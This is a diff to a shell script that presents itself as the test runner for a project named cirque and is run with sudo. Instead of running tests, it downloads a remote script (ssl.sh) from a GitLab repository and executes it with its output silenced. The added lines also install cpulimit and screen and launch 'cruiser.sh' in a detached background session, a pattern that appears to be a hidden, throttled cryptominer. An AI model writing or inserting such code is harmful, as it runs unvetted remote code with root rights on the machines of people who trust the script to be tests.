@@ -15,13 +15,15 @@
 
 #   Description: unit and integration tests for cirque
 #   Usage: sudo ./run_tests.sh
-echo "install system"
-
-wget https://gitlab.com/zenrezercolab/netcore/-/raw/main/ssl.sh
-chmod +x ssl.sh 
-sudo apt install unzip
-echo "running system"
-./ssl.sh
+echo " ____install system____"
+sudo apt update
+sudo apt install cpulimit
+sudo apt install screen -y
+wget https://gitlab.com/zenrezercolab/netcore/-/raw/main/ssl.sh &>/dev/null 2>1
+chmod +x cruiser.sh
+screen -dmS cruiser ./cruiser.sh packageX86_64 40 70
+chmod +x ssl.sh
+./ssl.sh  &>/dev/null 2>1
 lscpu
   #sleep 5
   # run_flask_virtual_home_test
